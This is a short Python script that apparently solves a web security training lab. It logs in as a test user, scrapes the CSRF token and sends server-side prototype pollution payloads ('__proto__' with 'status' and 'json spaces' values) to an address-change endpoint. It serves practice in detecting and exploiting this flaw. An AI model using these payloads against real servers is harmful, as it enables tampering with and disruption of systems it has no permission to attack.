import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
change_url = burp_url + '/my-account/change-address'

session = requests.Session()

response = session.get(login_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)

burp_json = {"csrf": csrf, "password": "peter", "username": "wiener"}
session.post(login_url, json=burp_json)

cookie_value = session.cookies.get('session')


burp_json_invalid = '{"__proto__": {"status": 400} "address_line_1": "Wiener HQ", "address_line_2": "One Wiener Way", "city": "Wienerville", "country": "UK", "postcode": "BU1 1RP", "sessionId": "' + cookie_value + '"}'
session.post(change_url, data=burp_json_invalid)

burp_json = {"__proto__": {"json spaces": 0}, "address_line_1": "Wiener HQ","address_line_2": "One Wiener Way", "city": "Wienerville", "country": "UK", "postcode": "BU1 1RP", "sessionId": cookie_value}
session.post(change_url, json=burp_json)


burp_json = {"__proto__": {"json spaces": 100}, "address_line_1": "Wiener HQ","address_line_2": "One Wiener Way", "city": "Wienerville", "country": "UK", "postcode": "BU1 1RP", "sessionId": cookie_value}

session.post(change_url, json=burp_json)
